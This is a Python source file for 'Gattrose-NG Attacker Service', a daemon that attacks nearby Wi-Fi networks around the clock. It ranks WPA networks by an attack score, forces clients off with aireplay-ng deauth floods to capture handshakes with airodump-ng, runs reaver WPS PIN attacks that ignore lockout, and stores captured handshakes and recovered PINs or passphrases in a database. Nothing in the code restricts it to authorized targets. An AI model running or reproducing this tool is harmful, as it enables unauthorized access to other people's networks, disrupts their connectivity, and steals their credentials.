#!/usr/bin/env python3
"""
Gattrose-NG Attacker Service Daemon

24/7 automated attack service
- Monitors database for high-value targets
- Prioritizes by attack score
- Captures handshakes automatically
- Performs WPS attacks
- Updates database with results
"""

import os
import sys
import time
import signal
import subprocess
from pathlib import Path
from datetime import datetime, timedelta
from typing import Optional, List, Dict, Tuple

# Add project root to path
PROJECT_ROOT = Path(__file__).parent.parent.parent
sys.path.insert(0, str(PROJECT_ROOT))

from src.database.models import get_session, Network, Handshake, ScanSession, AttackQueue
from src.tools.wifi_monitor import WiFiMonitorManager
from src.version import VERSION


class AttackerServiceDaemon:
    """24/7 automated attacker daemon"""

    def __init__(self):
        self.running = False
        self.monitor_interface = None
        self.current_attack = None
        self.attack_history = {}  # BSSID -> last_attempt_time
        self.cooldown_period = 3600  # 1 hour cooldown per target
        self.setup_signal_handlers()

        print(f"[*] Gattrose-NG Attacker Service v{VERSION}")
        print(f"[*] PID: {os.getpid()}")

    def setup_signal_handlers(self):
        """Setup graceful shutdown handlers"""
        signal.signal(signal.SIGTERM, self.signal_handler)
        signal.signal(signal.SIGINT, self.signal_handler)

    def signal_handler(self, signum, frame):
        """Handle shutdown signals"""
        print(f"\n[*] Received signal {signum}, shutting down gracefully...")
        self.shutdown()
        sys.exit(0)

    def setup_monitor_mode(self) -> bool:
        """Setup wireless interface in monitor mode"""
        print("[*] Setting up monitor mode...")

        manager = WiFiMonitorManager()

        # Detect wireless interfaces
        interfaces = manager.get_wireless_interfaces()
        if not interfaces:
            print("[!] No wireless interfaces found")
            return False

        print(f"[*] Found wireless interfaces: {', '.join(interfaces)}")

        # Use first interface
        interface = interfaces[0]

        # Enable monitor mode
        success, monitor_iface, message = manager.enable_monitor_mode(interface)

        if success:
            self.monitor_interface = monitor_iface
            print(f"[✓] Monitor mode enabled: {monitor_iface}")
            return True
        else:
            print(f"[!] Failed to enable monitor mode: {message}")
            return False

    def get_high_value_targets(self, limit: int = 10) -> List[Network]:
        """
        Get high-value attack targets from database

        Prioritizes by:
        1. Attack score (highest first)
        2. Not recently attempted
        3. No existing handshake
        4. WPA/WPA2 encryption
        """
        session = get_session()
        try:
            # Query for targets
            targets = session.query(Network).filter(
                Network.encryption.like('%WPA%'),  # Only WPA networks
                Network.last_seen > datetime.utcnow() - timedelta(hours=24)  # Seen recently
            ).order_by(
                Network.current_attack_score.desc()
            ).limit(limit * 3).all()  # Get extra to filter

            # Filter out recently attempted and already cracked
            filtered = []
            for target in targets:
                # Skip if recently attempted
                if target.bssid in self.attack_history:
                    last_attempt = self.attack_history[target.bssid]
                    if (datetime.utcnow() - last_attempt).total_seconds() < self.cooldown_period:
                        continue

                # Check if we already have a valid handshake
                existing_hs = session.query(Handshake).filter_by(
                    network_id=target.id,
                    is_complete=True
                ).first()

                if existing_hs and not existing_hs.is_cracked:
                    # Have handshake but not cracked - lower priority
                    continue

                filtered.append(target)

                if len(filtered) >= limit:
                    break

            print(f"[*] Found {len(filtered)} high-value targets")
            for i, target in enumerate(filtered[:5]):
                print(f"    {i+1}. {target.ssid or 'Hidden'} ({target.bssid}) - Score: {target.current_attack_score}")

            return filtered

        finally:
            session.close()

    def get_queued_attacks(self, limit: int = 10) -> List[Tuple[AttackQueue, Network]]:
        """
        Get pending attacks from the AttackQueue database

        Returns list of (AttackQueue, Network) tuples ordered by priority
        """
        session = get_session()
        try:
            # Query for pending attacks ordered by priority (higher first)
            queue_items = session.query(AttackQueue).filter_by(
                status='pending'
            ).order_by(
                AttackQueue.priority.desc()
            ).limit(limit).all()

            if not queue_items:
                return []

            # Fetch associated networks
            results = []
            for queue_item in queue_items:
                network = session.query(Network).filter_by(id=queue_item.network_id).first()
                if network:
                    results.append((queue_item, network))

            print(f"[*] Found {len(results)} queued attacks from database")
            for i, (queue_item, network) in enumerate(results[:5]):
                print(f"    {i+1}. {network.ssid or 'Hidden'} ({network.bssid}) - Priority: {queue_item.priority}, Type: {queue_item.attack_type}")

            return results

        finally:
            session.close()

    def update_queue_status(self, queue_id: int, status: str, result_message: str = None, success: bool = None):
        """Update AttackQueue item status"""
        session = get_session()
        try:
            queue_item = session.query(AttackQueue).filter_by(id=queue_id).first()
            if queue_item:
                queue_item.status = status
                if result_message:
                    queue_item.result_message = result_message
                if success is not None:
                    queue_item.success = success
                if status == 'in_progress' and not queue_item.started_at:
                    queue_item.started_at = datetime.utcnow()
                elif status in ('completed', 'failed'):
                    queue_item.completed_at = datetime.utcnow()
                session.commit()
                print(f"[*] Updated queue item {queue_id} status to '{status}'")
        except Exception as e:
            print(f"[!] Error updating queue status: {e}")
            session.rollback()
        finally:
            session.close()

    def capture_handshake(self, target: Network, timeout: int = 300) -> Tuple[bool, Optional[str]]:
        """
        Capture WPA handshake for target

        Args:
            target: Network to attack
            timeout: Maximum time in seconds

        Returns:
            (success, cap_file_path)
        """
        print(f"\n[*] Attacking: {target.ssid or 'Hidden'} ({target.bssid})")
        print(f"[*] Attack score: {target.current_attack_score}")
        print(f"[*] Channel: {target.channel}")

        # Create captures directory
        captures_dir = PROJECT_ROOT / "data" / "captures" / "handshakes"
        captures_dir.mkdir(parents=True, exist_ok=True)

        # Generate capture filename
        timestamp = datetime.utcnow().strftime("%Y%m%d_%H%M%S")
        safe_ssid = "".join(c for c in (target.ssid or "hidden") if c.isalnum() or c in (' ', '-', '_'))
        cap_base = captures_dir / f"{safe_ssid}_{target.bssid.replace(':', '')}_{timestamp}"

        # Record attempt
        self.attack_history[target.bssid] = datetime.utcnow()

        # Step 1: Start airodump-ng on target channel
        print(f"[*] Starting airodump-ng on channel {target.channel}")
        airodump_cmd = [
            "airodump-ng",
            "--bssid", target.bssid,
            "--channel", str(target.channel),
            "--write", str(cap_base),
            "--output-format", "pcap",
            self.monitor_interface
        ]

        try:
            airodump_proc = subprocess.Popen(
                airodump_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Wait a moment for airodump to start
            time.sleep(3)

            # Step 2: Send deauth packets to force handshake
            print(f"[*] Sending deauth packets...")
            aireplay_cmd = [
                "aireplay-ng",
                "--deauth", "10",  # Send 10 deauth packets
                "-a", target.bssid,
                self.monitor_interface
            ]

            subprocess.run(
                aireplay_cmd,
                timeout=15,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            # Wait for handshake capture
            print(f"[*] Waiting for handshake (timeout: {timeout}s)...")
            start_time = time.time()

            while (time.time() - start_time) < timeout:
                # Check if we have a .cap file
                cap_file = Path(f"{cap_base}-01.cap")
                if cap_file.exists() and cap_file.stat().st_size > 10000:  # At least 10KB
                    # Verify handshake with aircrack-ng
                    verify_result = subprocess.run(
                        ["aircrack-ng", str(cap_file)],
                        capture_output=True,
                        text=True,
                        timeout=10
                    )

                    if "handshake" in verify_result.stdout.lower():
                        print(f"[✓] Handshake captured!")
                        airodump_proc.terminate()
                        return True, str(cap_file)

                time.sleep(2)

            # Timeout
            print(f"[!] Handshake capture timed out")
            airodump_proc.terminate()
            return False, None

        except subprocess.TimeoutExpired:
            print(f"[!] Attack timed out")
            return False, None
        except Exception as e:
            print(f"[!] Attack error: {e}")
            return False, None

    def attempt_wps_attack(self, target: Network, timeout: int = 600) -> Tuple[bool, Optional[str]]:
        """
        Attempt WPS PIN attack

        Args:
            target: Network to attack
            timeout: Maximum time in seconds

        Returns:
            (success, pin_or_key)
        """
        if not target.wps_enabled:
            return False, None

        print(f"\n[*] WPS Attack: {target.ssid or 'Hidden'} ({target.bssid})")

        try:
            # Run reaver for WPS attack
            reaver_cmd = [
                "reaver",
                "-i", self.monitor_interface,
                "-b", target.bssid,
                "-c", str(target.channel),
                "-vv",
                "-L",  # Ignore locked state
                "-N",  # Don't send NACK messages
                "-T", "0.5",  # Timeout
                "-d", "2"  # Delay between attempts
            ]

            print(f"[*] Running WPS attack (timeout: {timeout}s)...")
            result = subprocess.run(
                reaver_cmd,
                capture_output=True,
                text=True,
                timeout=timeout
            )

            output = result.stdout + result.stderr

            # Check for WPS PIN in output
            if "WPS PIN:" in output:
                import re
                pin_match = re.search(r'WPS PIN:\s*["\']?(\d+)["\']?', output)
                if pin_match:
                    pin = pin_match.group(1)
                    print(f"[✓] WPS PIN found: {pin}")
                    return True, pin

            # Check for WPA PSK in output
            if "WPA PSK:" in output:
                import re
                psk_match = re.search(r'WPA PSK:\s*["\']?([^"\']+)["\']?', output)
                if psk_match:
                    psk = psk_match.group(1)
                    print(f"[✓] WPA PSK found: {psk}")
                    return True, psk

            print(f"[!] WPS attack unsuccessful")
            return False, None

        except subprocess.TimeoutExpired:
            print(f"[!] WPS attack timed out")
            return False, None
        except Exception as e:
            print(f"[!] WPS attack error: {e}")
            return False, None

    def save_handshake_to_database(self, target: Network, cap_file: str):
        """Save captured handshake to database"""
        session = get_session()
        try:
            # Verify handshake completeness using detailed EAPOL analysis
            from src.services.handshake_analysis import HandshakeAnalyzer
            analyzer = HandshakeAnalyzer()
            analysis = analyzer.analyze_handshake(cap_file, target.bssid)

            completeness_score = analysis.get('completeness_score', 0)
            is_complete = completeness_score >= 60  # At least M1+M2 required

            if not is_complete:
                print(f"[!] Handshake incomplete (score: {completeness_score}%), requires M1+M2 minimum")

            # Check if handshake already exists
            existing = session.query(Handshake).filter_by(
                network_id=target.id
            ).first()

            if existing:
                # Update existing
                existing.file_path = cap_file
                existing.captured_at = datetime.utcnow()
                existing.is_complete = is_complete
                print(f"[✓] Updated handshake in database (complete: {is_complete}, score: {completeness_score}%)")
            else:
                # Create new
                from src.utils.serial import generate_serial
                handshake = Handshake(
                    serial=generate_serial("hs"),
                    network_id=target.id,
                    file_path=cap_file,
                    is_complete=is_complete,
                    captured_at=datetime.utcnow()
                )
                session.add(handshake)
                print(f"[✓] Saved handshake to database (complete: {is_complete}, score: {completeness_score}%)")

            # Update scan session handshake count
            live_scan = session.query(ScanSession).filter_by(status='live').first()
            if live_scan:
                live_scan.handshakes_captured = session.query(Handshake).filter_by(
                    is_complete=True
                ).count()

            session.commit()

        except Exception as e:
            print(f"[!] Error saving handshake: {e}")
            session.rollback()
        finally:
            session.close()

    def run(self):
        """Main service loop"""
        print("[*] Starting Attacker Service...")

        # Setup monitor mode
        if not self.setup_monitor_mode():
            print("[!] Failed to setup monitor mode")
            return 1

        # Main loop
        self.running = True
        print("[✓] Attacker service running")
        print(f"[*] Cooldown period: {self.cooldown_period}s ({self.cooldown_period // 60} minutes)")
        print("[*] Scanning for targets every 30 seconds...")

        attack_round = 0

        try:
            while self.running:
                attack_round += 1
                print(f"\n{'='*60}")
                print(f"Attack Round #{attack_round}")
                print(f"{'='*60}")

                # First, check for queued attacks from database
                queued_attacks = self.get_queued_attacks(limit=5)

                if queued_attacks:
                    print(f"[*] Processing {len(queued_attacks)} queued attacks from database")

                    # Process queued attacks
                    for queue_item, target in queued_attacks:
                        if not self.running:
                            break

                        # Mark as in progress
                        self.update_queue_status(queue_item.id, 'in_progress')

                        # Determine attack type
                        if queue_item.attack_type == 'wps' and target.wps_enabled and not target.wps_locked:
                            print(f"\n[*] Queue item {queue_item.id}: WPS attack on {target.ssid or 'Hidden'}")
                            success, result = self.attempt_wps_attack(target, timeout=300)

                            if success:
                                self.update_queue_status(queue_item.id, 'completed', result_message=f"WPS cracked: {result}", success=True)
                                # TODO: Save WPS PIN/PSK to database
                            else:
                                self.update_queue_status(queue_item.id, 'failed', result_message="WPS attack failed", success=False)

                        else:
                            # Standard handshake capture
                            print(f"\n[*] Queue item {queue_item.id}: Handshake capture for {target.ssid or 'Hidden'}")
                            success, cap_file = self.capture_handshake(target, timeout=120)

                            if success and cap_file:
                                self.save_handshake_to_database(target, cap_file)
                                self.update_queue_status(queue_item.id, 'completed', result_message=f"Handshake captured: {Path(cap_file).name}", success=True)
                            else:
                                self.update_queue_status(queue_item.id, 'failed', result_message="Handshake capture failed", success=False)

                        # Brief pause between attacks
                        time.sleep(5)

                else:
                    # No queued attacks, fall back to automatic target selection
                    print("[*] No queued attacks, using automatic target selection")
                    targets = self.get_high_value_targets(limit=5)

                    if not targets:
                        print("[*] No targets found, waiting...")
                        time.sleep(30)
                        continue

                    # Attack each target
                    for target in targets:
                        if not self.running:
                            break

                        # Try WPS first if enabled
                        if target.wps_enabled and not target.wps_locked:
                            print(f"\n[*] Target has WPS enabled, trying WPS attack first...")
                            success, result = self.attempt_wps_attack(target, timeout=300)

                            if success:
                                # WPS attack succeeded!
                                session = get_session()
                                try:
                                    net = session.query(Network).filter_by(id=target.id).first()
                                    if net:
                                        # TODO: Save WPS PIN/PSK
                                        print(f"[✓] WPS attack successful on {net.ssid}")
                                    session.commit()
                                finally:
                                    session.close()
                                continue

                        # Standard handshake capture
                        success, cap_file = self.capture_handshake(target, timeout=120)

                        if success and cap_file:
                            self.save_handshake_to_database(target, cap_file)
                        else:
                            print(f"[!] Failed to capture handshake for {target.ssid or target.bssid}")

                        # Brief pause between attacks
                        time.sleep(5)

                # Wait before next round
                print(f"\n[*] Attack round complete, waiting 30s...")
                time.sleep(30)

        except KeyboardInterrupt:
            print("\n[*] Interrupted by user")
        except Exception as e:
            print(f"\n[!] Error in main loop: {e}")
            import traceback
            traceback.print_exc()

        finally:
            self.shutdown()

        return 0

    def shutdown(self):
        """Cleanup and shutdown"""
        print("[*] Shutting down attacker service...")

        self.running = False

        # Disable monitor mode
        if self.monitor_interface:
            try:
                print("[*] Disabling monitor mode...")
                manager = WiFiMonitorManager()
                manager.disable_monitor_mode(self.monitor_interface)
                print("[✓] Monitor mode disabled")
            except Exception as e:
                print(f"[!] Error disabling monitor mode: {e}")

        print("[✓] Attacker service shutdown complete")


def main():
    """Entry point"""
    daemon = AttackerServiceDaemon()
    sys.exit(daemon.run())


if __name__ == "__main__":
    main()
